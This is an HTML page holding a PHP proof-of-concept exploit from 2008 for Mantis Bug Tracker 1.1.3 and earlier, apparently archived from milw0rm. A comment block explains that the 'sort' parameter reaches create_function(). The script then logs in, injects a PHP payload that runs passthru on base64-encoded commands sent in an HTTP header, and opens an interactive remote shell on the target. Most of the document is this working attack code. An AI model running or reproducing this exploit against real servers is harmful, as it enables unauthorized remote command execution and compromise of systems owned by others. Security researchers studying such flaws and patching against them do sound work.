<html><head><title>Mantis Bug Tracker <= 1.1.3 Remote Code Execution Exploit</title></head><pre>&lt;?php

/*
	--------------------------------------------------------------------------------
	Mantis Bug Tracker &lt;= 1.1.3 (manage_proj_page.php) Remote Code Execution Exploit
	--------------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.mantisbt.org/
	
	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.
	
	[-] vulnerable code in /manage_proj_page.php
	
	32.	$f_sort	= gpc_get_string( 'sort', 'name' ); &lt;=== this is taken and stripslashed from $_GET['sort']
	33.	$f_dir	= gpc_get_string( 'dir', 'ASC' );
	
	(...)
	
	89.	$t_projects = multi_sort( $t_full_projects, $f_sort, $t_direction ); &lt;=== and here is passed to multi_sort()
	90.	$t_stack    = array( $t_projects );
	
	[-] multi_sort() function defined into /core/utility_api.php
	
	185.	# --------------------
	186.	# Sort a multi-dimensional array by one of its keys
	187.	function multi_sort( $p_array, $p_key, $p_direction=ASCENDING ) {
	188.		if ( DESCENDING == $p_direction ) {
	189.			$t_factor = -1;
	190.		} else {
	191.			# might as well allow everything else to mean ASC rather than erroring
	192.			$t_factor = 1;
	193.		}
	194.
	195.		$t_function = create_function( '$a, $b', &quot;return $t_factor * strnatcasecmp( \$a['$p_key'], \$b['$p_key'] );&quot; );
	196.		uasort( $p_array, $t_function );
	197.		return $p_array;
	198.	}
	
	An attacker could be able to inject and execute PHP code through $_GET['sort'],	that is passed to create_function()
	at line 195 into multi_sort() function body. By default only registered users can access to manage_proj_page.php
	(I've tested this on 1.1.3 version), because of this sometimes this PoC works only with a valid account.
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function check_login()
{
	global $host, $path, $user, $pass, $cookie;
	
	$packet  = &quot;GET {$path}manage_proj_page.php HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	
	if (preg_match(&quot;/Location: login_page.php/&quot;, http_send($host, $packet)))
	{
		if (isset($pass))
		{
			$payload = &quot;username={$user}&amp;password={$pass}&quot;;
			$packet  = &quot;POST {$path}login.php HTTP/1.0\r\n&quot;;
			$packet .= &quot;Host: {$host}\r\n&quot;;
			$packet .= &quot;Cookie: PHPSESSID=&quot;.md5(&quot;foo&quot;).&quot;\r\n&quot;;
			$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
			$packet .= &quot;Connection: close\r\n\r\n&quot;;
			$packet .= $payload;
			
			if (!preg_match(&quot;/Set-Cookie: (.*);/&quot;, http_send($host, $packet), $match)) die(&quot;\n[-] Login failed...\n&quot;);
			$cookie = $match[1];
		}
		else die(&quot;\n[-] Credentials needed...\n&quot;);
	}
}

print &quot;\n+-------------------------------------------------------------------+&quot;;
print &quot;\n| Mantis Bug Tracker &lt;= 1.1.3 Remote Code Execution Exploit by EgiX |&quot;;
print &quot;\n+-------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path [user] [password]\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /mantis/&quot;;
	print &quot;\nExample....: php $argv[0] localhost / user pass\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$pass = $argv[4];

check_login();

$code	 = &quot;']);}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;%%23&quot;;
$packet  = &quot;GET {$path}manage_proj_page.php?sort={$code} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cookie: PHPSESSID=&quot;.md5(&quot;foo&quot;).(isset($cookie) ? &quot;; {$cookie}&quot; : &quot;&quot;).&quot;\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nmantis-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
		preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed...\n&quot;);
	}
	else break;
}

?&gt;

# milw0rm.com [2008-10-16]</pre></html>